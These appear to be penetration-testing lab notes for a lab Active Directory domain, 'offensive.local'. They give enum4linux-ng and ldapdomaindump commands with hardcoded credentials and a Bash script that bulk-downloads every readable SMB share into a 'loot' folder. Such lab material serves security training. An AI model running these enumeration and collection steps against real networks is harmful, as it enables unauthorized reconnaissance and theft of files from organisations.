# Mapping attack vectors

# Use enum4linux to get all enumeration modules: users, groups, shares, policies, sessions, OS info, etc.
enum4linux-ng 192.168.56.2 -u franky.lanie -p 'Password123' -w offensive.local -A > /tmp/enum_output.txt # save the output to enum_output.txt

# Use ldapdomaindump.py to collect more information about the objects inside the AD including computers
ldapdomaindump 192.168.56.2 -u "OFFENSIVE.LOCAL\franky.lanie" -p Password123 -o /home/kali/Desktop/loot # save the output to a loot folder

# Create a Bash script (smb_enum_download.sh) to automatically to download all shared files from SYSVOL and NETLOGON

#!/bin/bash
SERVER="192.168.56.2"
DOMAIN="offensive.local"
USERNAME="franky.lanie"
PASSWORD="Password123"
OUTPUT_DIR="./smb_downloads"
mkdir -p "$OUTPUT_DIR"

# Function to recursively download files using smbclient
download_share() {
    SHARE=$1
    echo "[*] Connecting to share: $SHARE"

    smbclient "//$SERVER/$SHARE" "$PASSWORD" -U "$DOMAIN\\$USERNAME" -c "
        recurse ON;
        prompt OFF;
        lcd \"$OUTPUT_DIR/$SHARE\";
        mkdir \"$OUTPUT_DIR/$SHARE\";
        cd \\;
        mget *"
}
# Get list of shares
SHARES=$(smbclient -L "//$SERVER" -U "$DOMAIN\\$USERNAME%$PASSWORD" 2>/dev/null | awk '/Disk/ {print $1}' | grep -vE 'ADMIN\$|C\$|IPC\$')

for share in $SHARES; do
    mkdir -p "$OUTPUT_DIR/$share"
    download_share "$share"
done

# Run the Bash script 
chmod +x smb_enum_download.sh                                                                                 
./smb_enum_download.sh